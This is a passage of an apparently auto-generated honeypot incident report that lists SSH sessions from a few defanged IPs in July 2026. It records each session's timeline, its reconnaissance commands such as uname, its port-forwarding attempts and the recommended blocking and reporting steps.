| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:31:06` | `cowrie.session.connect` |
| `2026-07-19 10:31:07` | `cowrie.client.version` |
| `2026-07-19 10:31:07` | `cowrie.client.kex` |
| `2026-07-19 10:31:16` | `cowrie.login.success` |
| `2026-07-19 10:31:22` | `cowrie.session.params` |
| `2026-07-19 10:31:22` | `cowrie.command.input` |
| `2026-07-19 10:31:24` | `cowrie.log.closed` |
| `2026-07-19 10:31:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6675ffed0c88

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:31 |
| **Last Seen** | 2026-07-19 10:31 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:31:15` | `cowrie.session.connect` |
| `2026-07-19 10:31:17` | `cowrie.client.version` |
| `2026-07-19 10:31:17` | `cowrie.client.kex` |
| `2026-07-19 10:31:26` | `cowrie.login.success` |
| `2026-07-19 10:31:31` | `cowrie.session.params` |
| `2026-07-19 10:31:31` | `cowrie.command.input` |
| `2026-07-19 10:31:32` | `cowrie.log.closed` |
| `2026-07-19 10:31:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a204338b2860

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-07-19 10:31 |
| **Last Seen** | 2026-07-19 10:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:31:19` | `cowrie.session.connect` |
| `2026-07-19 10:31:20` | `cowrie.client.version` |
| `2026-07-19 10:31:20` | `cowrie.client.kex` |
| `2026-07-19 10:31:23` | `cowrie.login.success` |
| `2026-07-19 10:31:23` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:31:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b980059f3362

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:31 |
| **Last Seen** | 2026-07-19 10:31 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:31:30` | `cowrie.session.connect` |
| `2026-07-19 10:31:31` | `cowrie.client.version` |
| `2026-07-19 10:31:31` | `cowrie.client.kex` |
| `2026-07-19 10:31:38` | `cowrie.login.success` |
| `2026-07-19 10:31:45` | `cowrie.session.params` |
| `2026-07-19 10:31:45` | `cowrie.command.input` |
| `2026-07-19 10:31:47` | `cowrie.log.closed` |
| `2026-07-19 10:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea78c23b1738

| Field | Detail |
|---|---|
| **Source IP** | `118.43.235[.]198` |
| **First Seen** | 2026-07-19 10:31 |
| **Last Seen** | 2026-07-19 10:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:31:33` | `cowrie.session.connect` |
| `2026-07-19 10:31:34` | `cowrie.client.version` |
| `2026-07-19 10:31:34` | `cowrie.client.kex` |
| `2026-07-19 10:31:36` | `cowrie.login.success` |
| `2026-07-19 10:31:37` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.43.235[.]198` to AbuseIPDB if not already reported
- [ ] Block `118.43.235[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca3c948d7cac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:31 |
| **Last Seen** | 2026-07-19 10:32 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:31:42` | `cowrie.session.connect` |
| `2026-07-19 10:31:44` | `cowrie.client.version` |
| `2026-07-19 10:31:44` | `cowrie.client.kex` |
| `2026-07-19 10:31:57` | `cowrie.login.success` |
| `2026-07-19 10:32:02` | `cowrie.session.params` |
| `2026-07-19 10:32:02` | `cowrie.command.input` |
| `2026-07-19 10:32:06` | `cowrie.log.closed` |
| `2026-07-19 10:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acba9dc8ec88

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:31 |
| **Last Seen** | 2026-07-19 10:32 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:31:54` | `cowrie.session.connect` |
| `2026-07-19 10:31:56` | `cowrie.client.version` |
| `2026-07-19 10:31:56` | `cowrie.client.kex` |
| `2026-07-19 10:32:07` | `cowrie.login.success` |
| `2026-07-19 10:32:12` | `cowrie.session.params` |
| `2026-07-19 10:32:12` | `cowrie.command.input` |
| `2026-07-19 10:32:17` | `cowrie.log.closed` |
| `2026-07-19 10:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36ee80aa7162

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:32 |
| **Last Seen** | 2026-07-19 10:32 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:32:08` | `cowrie.session.connect` |
| `2026-07-19 10:32:10` | `cowrie.client.version` |
| `2026-07-19 10:32:10` | `cowrie.client.kex` |
| `2026-07-19 10:32:25` | `cowrie.login.success` |
| `2026-07-19 10:32:36` | `cowrie.session.params` |
| `2026-07-19 10:32:36` | `cowrie.command.input` |
| `2026-07-19 10:32:40` | `cowrie.log.closed` |
| `2026-07-19 10:32:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c173037ad8a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:32 |
| **Last Seen** | 2026-07-19 10:32 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:32:16` | `cowrie.session.connect` |
| `2026-07-19 10:32:19` | `cowrie.client.version` |
| `2026-07-19 10:32:19` | `cowrie.client.kex` |
| `2026-07-19 10:32:38` | `cowrie.login.success` |
| `2026-07-19 10:32:43` | `cowrie.session.params` |
| `2026-07-19 10:32:43` | `cowrie.command.input` |
| `2026-07-19 10:32:45` | `cowrie.log.closed` |
| `2026-07-19 10:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88c6d673aa78

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:32 |
| **Last Seen** | 2026-07-19 10:32 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:32:31` | `cowrie.session.connect` |
| `2026-07-19 10:32:35` | `cowrie.client.version` |
| `2026-07-19 10:32:35` | `cowrie.client.kex` |
| `2026-07-19 10:32:45` | `cowrie.login.success` |
| `2026-07-19 10:32:50` | `cowrie.session.params` |
| `2026-07-19 10:32:50` | `cowrie.command.input` |
| `2026-07-19 10:32:51` | `cowrie.log.closed` |
| `2026-07-19 10:32:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e47b12b00bb0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:32 |
| **Last Seen** | 2026-07-19 10:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:32:52` | `cowrie.session.connect` |
| `2026-07-19 10:32:53` | `cowrie.client.version` |
| `2026-07-19 10:32:53` | `cowrie.client.kex` |
| `2026-07-19 10:32:56` | `cowrie.login.success` |
| `2026-07-19 10:32:59` | `cowrie.session.params` |
| `2026-07-19 10:32:59` | `cowrie.command.input` |
| `2026-07-19 10:33:00` | `cowrie.log.closed` |
| `2026-07-19 10:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5034b17e79d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:33 |
| **Last Seen** | 2026-07-19 10:33 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:33:06` | `cowrie.session.connect` |
| `2026-07-19 10:33:07` | `cowrie.client.version` |
| `2026-07-19 10:33:07` | `cowrie.client.kex` |
| `2026-07-19 10:33:14` | `cowrie.login.success` |
| `2026-07-19 10:33:18` | `cowrie.session.params` |
| `2026-07-19 10:33:18` | `cowrie.command.input` |
| `2026-07-19 10:33:20` | `cowrie.log.closed` |
| `2026-07-19 10:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20576eefc19d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:33 |
| **Last Seen** | 2026-07-19 10:33 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:33:16` | `cowrie.session.connect` |
| `2026-07-19 10:33:18` | `cowrie.client.version` |
| `2026-07-19 10:33:18` | `cowrie.client.kex` |
| `2026-07-19 10:33:24` | `cowrie.login.success` |
| `2026-07-19 10:33:28` | `cowrie.session.params` |
| `2026-07-19 10:33:28` | `cowrie.command.input` |
| `2026-07-19 10:33:30` | `cowrie.log.closed` |
| `2026-07-19 10:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-504cfdb8ae9a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:33 |
| **Last Seen** | 2026-07-19 10:33 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:33:29` | `cowrie.session.connect` |
| `2026-07-19 10:33:31` | `cowrie.client.version` |
| `2026-07-19 10:33:31` | `cowrie.client.kex` |
| `2026-07-19 10:33:38` | `cowrie.login.success` |
| `2026-07-19 10:33:44` | `cowrie.session.params` |
| `2026-07-19 10:33:44` | `cowrie.command.input` |
| `2026-07-19 10:33:45` | `cowrie.log.closed` |
| `2026-07-19 10:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b304aea59e5b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:33 |
| **Last Seen** | 2026-07-19 10:34 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:33:44` | `cowrie.session.connect` |
| `2026-07-19 10:33:45` | `cowrie.client.version` |
| `2026-07-19 10:33:45` | `cowrie.client.kex` |
| `2026-07-19 10:33:53` | `cowrie.login.success` |
| `2026-07-19 10:34:00` | `cowrie.session.params` |
| `2026-07-19 10:34:00` | `cowrie.command.input` |
| `2026-07-19 10:34:02` | `cowrie.log.closed` |
| `2026-07-19 10:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4152742af9f5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:33 |
| **Last Seen** | 2026-07-19 10:34 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:33:54` | `cowrie.session.connect` |
| `2026-07-19 10:33:56` | `cowrie.client.version` |
| `2026-07-19 10:33:56` | `cowrie.client.kex` |
| `2026-07-19 10:34:04` | `cowrie.login.success` |
| `2026-07-19 10:34:08` | `cowrie.session.params` |
| `2026-07-19 10:34:08` | `cowrie.command.input` |
| `2026-07-19 10:34:11` | `cowrie.log.closed` |
| `2026-07-19 10:34:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5e1989cbe9b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:34 |
| **Last Seen** | 2026-07-19 10:34 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:34:08` | `cowrie.session.connect` |
| `2026-07-19 10:34:11` | `cowrie.client.version` |
| `2026-07-19 10:34:11` | `cowrie.client.kex` |
| `2026-07-19 10:34:18` | `cowrie.login.success` |
| `2026-07-19 10:34:24` | `cowrie.session.params` |
| `2026-07-19 10:34:24` | `cowrie.command.input` |
| `2026-07-19 10:34:26` | `cowrie.log.closed` |
| `2026-07-19 10:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-894147ad15ac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:34 |
| **Last Seen** | 2026-07-19 10:34 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:34:21` | `cowrie.session.connect` |
| `2026-07-19 10:34:24` | `cowrie.client.version` |
| `2026-07-19 10:34:24` | `cowrie.client.kex` |
| `2026-07-19 10:34:36` | `cowrie.login.success` |
| `2026-07-19 10:34:40` | `cowrie.session.params` |
| `2026-07-19 10:34:40` | `cowrie.command.input` |
| `2026-07-19 10:34:43` | `cowrie.log.closed` |
| `2026-07-19 10:34:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1243cd41f3fa

| Field | Detail |
|---|---|
| **Source IP** | `183.223.156[.]154` |
| **First Seen** | 2026-07-19 10:34 |
| **Last Seen** | 2026-07-19 10:34 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:34:32` | `cowrie.session.connect` |
| `2026-07-19 10:34:33` | `cowrie.client.version` |
| `2026-07-19 10:34:33` | `cowrie.client.kex` |
| `2026-07-19 10:34:37` | `cowrie.login.success` |
| `2026-07-19 10:34:39` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:34:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.223.156[.]154` to AbuseIPDB if not already reported
- [ ] Block `183.223.156[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a0e5de1259a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:34 |
| **Last Seen** | 2026-07-19 10:34 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:34:33` | `cowrie.session.connect` |
| `2026-07-19 10:34:36` | `cowrie.client.version` |
| `2026-07-19 10:34:36` | `cowrie.client.kex` |
| `2026-07-19 10:34:45` | `cowrie.login.success` |
| `2026-07-19 10:34:49` | `cowrie.session.params` |
| `2026-07-19 10:34:49` | `cowrie.command.input` |
| `2026-07-19 10:34:50` | `cowrie.log.closed` |
| `2026-07-19 10:34:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c52a41979b85

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:34 |
| **Last Seen** | 2026-07-19 10:35 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:34:49` | `cowrie.session.connect` |
| `2026-07-19 10:34:49` | `cowrie.client.version` |
| `2026-07-19 10:34:49` | `cowrie.client.kex` |
| `2026-07-19 10:34:59` | `cowrie.login.success` |
| `2026-07-19 10:35:03` | `cowrie.session.params` |
| `2026-07-19 10:35:03` | `cowrie.command.input` |
| `2026-07-19 10:35:06` | `cowrie.log.closed` |
| `2026-07-19 10:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94ad9bce19c7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:35 |
| **Last Seen** | 2026-07-19 10:35 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:35:00` | `cowrie.session.connect` |
| `2026-07-19 10:35:01` | `cowrie.client.version` |
| `2026-07-19 10:35:01` | `cowrie.client.kex` |
| `2026-07-19 10:35:10` | `cowrie.login.success` |
| `2026-07-19 10:35:19` | `cowrie.session.params` |
| `2026-07-19 10:35:19` | `cowrie.command.input` |
| `2026-07-19 10:35:20` | `cowrie.log.closed` |
| `2026-07-19 10:35:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a36a5807935a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:35 |
| **Last Seen** | 2026-07-19 10:35 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:35:09` | `cowrie.session.connect` |
| `2026-07-19 10:35:12` | `cowrie.client.version` |
| `2026-07-19 10:35:12` | `cowrie.client.kex` |
| `2026-07-19 10:35:20` | `cowrie.login.success` |
| `2026-07-19 10:35:23` | `cowrie.session.params` |
| `2026-07-19 10:35:23` | `cowrie.command.input` |
| `2026-07-19 10:35:26` | `cowrie.log.closed` |
| `2026-07-19 10:35:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e689123d4752

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 10:35 |
| **Last Seen** | 2026-07-19 10:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:35:13` | `cowrie.session.connect` |
| `2026-07-19 10:35:13` | `cowrie.client.version` |
| `2026-07-19 10:35:13` | `cowrie.client.kex` |
| `2026-07-19 10:35:13` | `cowrie.login.success` |
| `2026-07-19 10:35:14` | `cowrie.session.params` |
| `2026-07-19 10:35:14` | `cowrie.command.input` |
| `2026-07-19 10:35:14` | `cowrie.log.closed` |
| `2026-07-19 10:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b179dd7713f6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:35 |
| **Last Seen** | 2026-07-19 10:35 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:35:24` | `cowrie.session.connect` |
| `2026-07-19 10:35:27` | `cowrie.client.version` |
| `2026-07-19 10:35:27` | `cowrie.client.kex` |
| `2026-07-19 10:35:35` | `cowrie.login.success` |
| `2026-07-19 10:35:38` | `cowrie.session.params` |
| `2026-07-19 10:35:38` | `cowrie.command.input` |
| `2026-07-19 10:35:39` | `cowrie.log.closed` |
| `2026-07-19 10:35:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7dcfd5d9475

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:35 |
| **Last Seen** | 2026-07-19 10:35 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:35:39` | `cowrie.session.connect` |
| `2026-07-19 10:35:40` | `cowrie.client.version` |
| `2026-07-19 10:35:40` | `cowrie.client.kex` |
| `2026-07-19 10:35:46` | `cowrie.login.success` |
| `2026-07-19 10:35:51` | `cowrie.session.params` |
| `2026-07-19 10:35:51` | `cowrie.command.input` |
| `2026-07-19 10:35:54` | `cowrie.log.closed` |
| `2026-07-19 10:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
